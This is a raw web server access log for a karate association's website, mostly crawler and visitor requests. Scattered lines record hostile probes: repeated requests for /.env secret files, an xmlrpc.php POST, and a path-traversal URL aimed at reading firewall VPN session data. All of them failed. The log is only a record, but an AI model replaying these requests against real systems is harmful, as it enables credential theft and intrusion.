::ffff:51.222.253.9 - - [22/Nov/2022:01:27:31 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:192.241.209.62 - - [22/Nov/2022:01:44:50 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:54.36.148.226 - - [22/Nov/2022:01:49:34 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.12 - - [22/Nov/2022:01:49:36 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.5 - - [22/Nov/2022:01:49:47 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:203.10.99.204 - - [22/Nov/2022:01:49:48 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:51.222.253.14 - - [22/Nov/2022:01:49:54 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.12 - - [22/Nov/2022:01:50:00 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.15 - - [22/Nov/2022:01:50:06 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [22/Nov/2022:01:50:12 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [22/Nov/2022:01:50:18 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.6 - - [22/Nov/2022:01:50:24 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.1 - - [22/Nov/2022:01:50:31 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.3 - - [22/Nov/2022:01:50:37 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.5 - - [22/Nov/2022:01:50:43 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [22/Nov/2022:01:50:48 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.17 - - [22/Nov/2022:01:50:54 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.15 - - [22/Nov/2022:01:51:00 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.10 - - [22/Nov/2022:01:51:05 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:203.10.99.204 - - [22/Nov/2022:01:58:08 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:185.191.171.42 - - [22/Nov/2022:02:14:50 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.5 - - [22/Nov/2022:02:14:50 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:51.222.253.4 - - [22/Nov/2022:02:15:07 +0000] "GET /schoolsandschedules.html HTTP/1.1" 404 163 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:193.118.53.194 - - [22/Nov/2022:02:25:25 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:51.222.253.10 - - [22/Nov/2022:02:28:47 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:35.243.230.204 - - [22/Nov/2022:02:29:22 +0000] "GET / HTTP/1.1" 200 57378 "-" "python-requests/2.28.1"
::ffff:35.243.230.204 - - [22/Nov/2022:02:29:26 +0000] "GET /?p=1 HTTP/1.1" 200 57378 "-" "python-requests/2.28.1"
::ffff:35.243.230.204 - - [22/Nov/2022:02:29:33 +0000] "POST /xmlrpc.php HTTP/1.1" 404 150 "-" "python-requests/2.28.1"
::ffff:157.55.39.153 - - [22/Nov/2022:02:37:49 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:205.210.31.6 - - [22/Nov/2022:02:40:28 +0000] "GET / HTTP/1.0" 200 57378 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:135.125.217.54 - - [22/Nov/2022:02:40:33 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [22/Nov/2022:02:40:33 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:203.10.99.204 - - [22/Nov/2022:02:48:08 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:51.222.253.8 - - [22/Nov/2022:02:52:27 +0000] "GET /Shuri-line.html HTTP/1.1" 404 154 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:203.10.99.204 - - [22/Nov/2022:02:56:28 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:62.212.32.190 - - [22/Nov/2022:03:01:29 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:194.32.122.73 - - [22/Nov/2022:03:03:57 +0000] "GET / HTTP/1.1" 200 57378 "https://m.meendoru.net/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
::ffff:128.1.248.26 - - [22/Nov/2022:03:12:53 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:185.254.196.115 - - [22/Nov/2022:03:16:05 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [22/Nov/2022:03:16:06 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.222.253.10 - - [22/Nov/2022:03:18:47 +0000] "GET /locations.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:46.161.27.17 - - [22/Nov/2022:03:19:18 +0000] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 154 "-" "Python-urllib/3.10"
::ffff:135.181.74.243 - - [22/Nov/2022:03:28:23 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:28:25 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:28:29 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:28:34 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:28:37 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:28:49 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:28:51 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:28:56 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:29:03 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:29:06 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:29:12 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:29:17 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:29:20 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:29:29 +0000] "GET /events HTTP/1.1" 200 7135 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:29:37 +0000] "GET /joinemail?type=blackbeltclasses HTTP/1.1" 200 8998 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:29:42 +0000] "GET /joinemail?type=promotions HTTP/1.1" 200 8841 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:29:54 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.181.74.243 - - [22/Nov/2022:03:30:06 +0000] "GET /schools HTTP/1.1" 200 97308 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:192.241.210.169 - - [22/Nov/2022:03:30:40 +0000] "GET /ReportServer HTTP/1.1" 404 151 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:203.10.99.204 - - [22/Nov/2022:03:38:08 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:66.249.79.189 - - [22/Nov/2022:03:39:26 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.79.189 - - [22/Nov/2022:03:39:26 +0000] "GET /images/favicon.ico HTTP/1.1" 304 - "-" "Googlebot-Image/1.0"
::ffff:203.10.99.204 - - [22/Nov/2022:03:46:28 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:51.222.253.14 - - [22/Nov/2022:03:46:47 +0000] "GET /Naha-Line.html HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:198.199.95.208 - - [22/Nov/2022:03:47:27 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:40.77.167.4 - - [22/Nov/2022:03:47:36 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:203.10.99.204 - - [22/Nov/2022:04:03:08 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:51.222.253.1 - - [22/Nov/2022:04:04:05 +0000] "GET /terminology.html HTTP/1.1" 404 155 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:100.26.31.254 - - [22/Nov/2022:04:11:09 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/60.0.3093.68 Safari/537.32"
::ffff:203.10.99.204 - - [22/Nov/2022:04:11:28 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:61.0.182.127 - - [22/Nov/2022:04:19:22 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::ffff:95.214.235.205 - - [22/Nov/2022:04:19:40 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [22/Nov/2022:04:19:40 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [22/Nov/2022:04:22:14 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [22/Nov/2022:04:22:15 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.222.253.18 - - [22/Nov/2022:04:27:25 +0000] "GET /shinko-katas.html HTTP/1.1" 404 156 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:64.62.197.10 - - [22/Nov/2022:04:38:29 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:05 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:05 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:05 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:05 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:05 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:05 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:05 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:05 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:05 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:06 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:06 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:06 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:06 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:06 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:10 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:10 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:13 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:17 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:39:48 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:69.63.184.116 - - [22/Nov/2022:04:39:54 +0000] "GET / HTTP/1.1" 200 57378 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:69.63.184.112 - - [22/Nov/2022:04:39:54 +0000] "GET / HTTP/1.1" 200 57378 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:173.252.107.9 - - [22/Nov/2022:04:39:57 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:69.63.184.118 - - [22/Nov/2022:04:39:58 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:69.63.184.4 - - [22/Nov/2022:04:39:58 +0000] "GET / HTTP/1.1" 200 57378 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:108.202.243.61 - - [22/Nov/2022:04:40:08 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:40:08 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:40:09 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 179 "-" "MobileSafari/8614.1.25.0.31 CFNetwork/1390 Darwin/22.0.0"
::ffff:108.202.243.61 - - [22/Nov/2022:04:40:09 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 167 "-" "MobileSafari/8614.1.25.0.31 CFNetwork/1390 Darwin/22.0.0"
::ffff:108.202.243.61 - - [22/Nov/2022:04:40:09 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 171 "-" "MobileSafari/8614.1.25.0.31 CFNetwork/1390 Darwin/22.0.0"
::ffff:108.202.243.61 - - [22/Nov/2022:04:40:09 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 159 "-" "MobileSafari/8614.1.25.0.31 CFNetwork/1390 Darwin/22.0.0"
::ffff:108.202.243.61 - - [22/Nov/2022:04:40:09 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "MobileSafari/8614.1.25.0.31 CFNetwork/1390 Darwin/22.0.0"
::ffff:108.202.243.61 - - [22/Nov/2022:04:40:40 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:41:02 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:108.202.243.61 - - [22/Nov/2022:04:41:06 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:51.222.253.10 - - [22/Nov/2022:04:42:47 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:64.62.197.6 - - [22/Nov/2022:04:47:20 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84"
::ffff:108.202.243.61 - - [22/Nov/2022:04:52:44 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
::ffff:173.252.87.5 - - [22/Nov/2022:04:52:52 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
